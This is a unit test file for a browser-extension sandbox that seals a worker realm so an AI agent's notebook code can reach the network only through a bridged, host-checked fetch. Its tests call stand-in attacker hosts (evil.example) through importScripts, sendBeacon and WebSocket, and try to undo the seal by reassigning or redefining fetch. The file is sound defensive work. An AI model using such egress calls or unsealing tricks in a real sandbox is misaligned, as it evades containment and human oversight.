// The Notebook realm seal must (1) make the bridged fetch the only
// reachable network primitive — including deleting natives off the
// prototype chain, where worker globals actually inherit fetch and
// importScripts from — and (2) resist being undone, since the agent's
// js_notebook code runs in the same realm right after the seal module
// evaluates. The real-realm behavior (actual worker globals, evaluation
// order vs static imports, the host relay) is covered by the in-browser
// suite (extension/tests/unit/notebook-tab/notebook-seal.test.js); this file
// pins the pure semantics against mock globals.

import { describe, test, expect } from 'bun:test';
import { applyRealmSeal } from '../../extension/notebook-tab/notebook-neutralizers.js';

// Mock worker global: network primitives live where they live in a real
// DedicatedWorkerGlobalScope — constructors as own props of the global,
// fetch/importScripts inherited from the prototype (WorkerGlobalScope.
// prototype stand-in). postMessage/addEventListener are captured so the
// bridge protocol can be driven from the test.
const freshGlobal = () => {
  const posted: any[] = [];
  const listeners: Array<(ev: any) => void> = [];
  const nativeFetch = function fetch() { return 'NATIVE-FETCH'; };
  const proto: any = {
    fetch: nativeFetch,
    importScripts: function importScripts() { return 'NATIVE-IMPORTSCRIPTS'; },
    // CacheStorage lives on WorkerGlobalScope.prototype too; cache.add()/addAll()
    // run the Fetch algorithm, so the seal must block it like the rest.
    caches: {
      open: () => 'NATIVE-CACHE-OPEN', match: () => undefined,
      has: () => false, delete: () => false, keys: () => [],
    },
  };
  const g: any = Object.create(proto);
  g.XMLHttpRequest = function XMLHttpRequest() {};
  g.WebSocket = function WebSocket() {};
  g.EventSource = function EventSource() {};
  g.WebTransport = function WebTransport() {};
  g.Worker = function Worker() {};
  // (no WebSocketStream / SharedWorker — the seal must create the stubs
  // even where the platform lacks the API, like Firefox today.)
  g.navigator = { sendBeacon: () => true };
  g.postMessage = (m: any) => posted.push(m);
  g.addEventListener = (_type: string, fn: any) => listeners.push(fn);
  return { g, proto, posted, listeners, nativeFetch };
};

const respond = (listeners: Array<(ev: any) => void>, data: any) => {
  for (const fn of listeners) fn({ data });
};

describe('realm seal — raw channels are hard-blocked', () => {
  const CHANNELS = [
    'XMLHttpRequest', 'WebSocket', 'WebSocketStream', 'EventSource',
    'WebTransport', 'Worker', 'SharedWorker',
  ];

  test('every constructor channel throws NotebookEgressBlockedError under new', () => {
    const { g } = freshGlobal();
    applyRealmSeal(g);
    for (const name of CHANNELS) {
      let err: any;
      try { new g[name]('https://evil.example/'); } catch (e) { err = e; }
      expect(err?.name).toBe('NotebookEgressBlockedError');
      expect(String(err?.message)).toContain('peerd.egress.fetch');
      expect(err?.channel).toBe(name);
    }
  });

  test('channels missing from the platform still get throwing stubs', () => {
    const { g } = freshGlobal();
    expect(g.WebSocketStream).toBeUndefined();
    applyRealmSeal(g);
    expect(() => new g.WebSocketStream('wss://evil.example/')).toThrow('peerd.egress.fetch');
    expect(() => new g.SharedWorker('x.js')).toThrow('peerd.egress.fetch');
  });

  test('importScripts throws ours AND the prototype copy is gone', () => {
    const { g, proto } = freshGlobal();
    applyRealmSeal(g);
    expect(() => g.importScripts('https://evil.example/x.js')).toThrow('peerd.egress.fetch');
    // why this matters: WorkerGlobalScope.prototype.importScripts.call(self)
    // would sidestep an own-property stub.
    expect(Object.getOwnPropertyDescriptor(proto, 'importScripts')).toBeUndefined();
  });

  test('navigator.sendBeacon throws', () => {
    const { g } = freshGlobal();
    applyRealmSeal(g);
    expect(() => g.navigator.sendBeacon('https://evil.example/', 'data')).toThrow('peerd.egress.fetch');
  });

  test('the Cache API is sealed — its network verbs cannot reach the host', () => {
    // cache.add()/addAll() run the Fetch algorithm; the offscreen js_run host
    // that runs this SAME sealed worker allows https:, so the seal (not the page
    // CSP) must block it. The whole CacheStorage is replaced with throwing stubs.
    const { g, proto } = freshGlobal();
    applyRealmSeal(g);
    expect(() => g.caches.open('x')).toThrow('peerd.egress.fetch');
    expect(() => g.caches.match('x')).toThrow('peerd.egress.fetch');
    // the native CacheStorage is gone from the prototype chain, not just shadowed
    expect(Object.getOwnPropertyDescriptor(proto, 'caches')).toBeUndefined();
  });

  test('survives a navigator with no sendBeacon, and no navigator at all', () => {
    const a = freshGlobal();
    a.g.navigator = {};
    expect(() => applyRealmSeal(a.g)).not.toThrow();
    expect(() => a.g.navigator.sendBeacon('https://evil/')).toThrow('peerd.egress.fetch');

    const b = freshGlobal();
    delete b.g.navigator;
    expect(() => applyRealmSeal(b.g)).not.toThrow();
    expect(() => new b.g.WebSocket('wss://evil/')).toThrow('peerd.egress.fetch');
  });
});

describe('realm seal — native fetch is unrecoverable, bridge is pinned', () => {
  test('the prototype-chain fetch is deleted, not just shadowed', () => {
    const { g, proto, nativeFetch } = freshGlobal();
    applyRealmSeal(g);
    expect(Object.getOwnPropertyDescriptor(proto, 'fetch')).toBeUndefined();
    expect(g.fetch).not.toBe(nativeFetch);
    const desc = Object.getOwnPropertyDescriptor(g, 'fetch')!;
    expect(desc.writable).toBe(false);
    expect(desc.configurable).toBe(false);
  });

  test('reassignment, delete, and defineProperty all fail to unseal', () => {
    const { g } = freshGlobal();
    applyRealmSeal(g);
    const sealed = g.fetch;
    // Sloppy-mode shapes silently no-op; strict shapes throw. Either way
    // the sealed bridge must remain.
    try { g.fetch = () => 'evil'; } catch { /* strict throw */ }
    try { delete g.fetch; } catch { /* strict throw */ }
    let defineThrew = false;
    try { Object.defineProperty(g, 'fetch', { value: () => 'evil' }); }
    catch { defineThrew = true; }
    expect(defineThrew).toBe(true);
    expect(g.fetch).toBe(sealed);

    try { g.XMLHttpRequest = function () {}; } catch { /* strict throw */ }
    expect(() => new g.XMLHttpRequest()).toThrow('peerd.egress.fetch');
  });
});

describe('realm seal — the fetch bridge protocol', () => {
  test('fetch posts a fetch-request and resolves on fetch-response', async () => {
    const { g, posted, listeners } = freshGlobal();
    applyRealmSeal(g);
    const p = g.fetch('https://api.example/data');
    expect(posted.length).toBe(1);
    expect(posted[0].type).toBe('fetch-request');
    expect(posted[0].url).toBe('https://api.example/data');
    respond(listeners, {
      type: 'fetch-response', rid: posted[0].rid,
      ok: true, status: 200, bodyB64: btoa('hello'),
    });
    const resp = await p;
    expect(resp.ok).toBe(true);
    expect(resp.status).toBe(200);
    expect(await resp.text()).toBe('hello');
    expect(await resp.arrayBuffer()).toBeInstanceOf(ArrayBuffer);
  });

  test('json() parses the body', async () => {
    const { g, posted, listeners } = freshGlobal();
    applyRealmSeal(g);
    const p = g.fetch('https://api.example/j');
    respond(listeners, {
      type: 'fetch-response', rid: posted[0].rid,
      ok: true, status: 200, bodyB64: btoa('{"a":1}'),
    });
    expect(await (await p).json()).toEqual({ a: 1 });
  });

  test('a host-side error rejects with the relayed message', async () => {
    const { g, posted, listeners } = freshGlobal();
    applyRealmSeal(g);
    const p = g.fetch('https://denied.example/');
    respond(listeners, {
      type: 'fetch-response', rid: posted[0].rid,
      ok: false, status: 0, bodyB64: null, error: 'denylisted',
    });
    let err: any;
    try { await p; } catch (e) { err = e; }
    expect(String(err?.message)).toContain('fetch failed: denylisted');
  });

  test('Request-like input objects work; missing url rejects', async () => {
    const { g, posted, listeners } = freshGlobal();
    applyRealmSeal(g);
    const p = g.fetch({ url: 'https://api.example/r' });
    expect(posted[0].url).toBe('https://api.example/r');
    respond(listeners, {
      type: 'fetch-response', rid: posted[0].rid, ok: true, status: 204, bodyB64: null,
    });
    expect((await p).status).toBe(204);

    let err: any;
    try { await g.fetch(undefined); } catch (e) { err = e; }
    expect(err?.name).toBe('TypeError');
  });

  test('unrelated and duplicate responses are ignored', async () => {
    const { g, posted, listeners } = freshGlobal();
    applyRealmSeal(g);
    const p = g.fetch('https://api.example/once');
    respond(listeners, { type: 'opfs-response', rid: posted[0].rid, result: 'x' });
    respond(listeners, { type: 'fetch-response', rid: 999999, ok: true, status: 200, bodyB64: null });
    respond(listeners, { type: 'fetch-response', rid: posted[0].rid, ok: true, status: 201, bodyB64: null });
    // A second settle attempt must be a no-op (rid already consumed).
    respond(listeners, { type: 'fetch-response', rid: posted[0].rid, ok: false, status: 0, error: 'late' });
    expect((await p).status).toBe(201);
  });
});
